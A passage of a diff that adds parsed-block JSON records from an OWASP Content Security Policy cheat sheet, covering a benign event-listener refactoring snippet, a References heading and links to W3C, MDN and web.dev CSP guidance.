+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00131",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 131,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```javascript\ndocument.getElementById(\"button1\").addEventListener('click', doSomething);\n```",
+    "text_hash": "bf1ccc186a8a881224fef666f5e2e6618713340ed639aed935ad271ada2c9b10",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 364,
+      "end_line": 366
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": "javascript",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00132",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 132,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## References",
+    "text_hash": "65b72d86eeeb214ab8ca5fd24cb7cd7773e58084e95b670040df03e21e8c6fa7",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 368,
+      "end_line": 368
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "References"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00133",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 133,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)\n- [MDN Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)\n- [Strict CSP deployment guidance](https://web.dev/articles/strict-csp)",
+    "text_hash": "c4e9d534544120c263c291cbd14eacf102fe0a1fc30fc1ed593a67f3babcb860",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 370,
+      "end_line": 372
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "References"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  }
+]
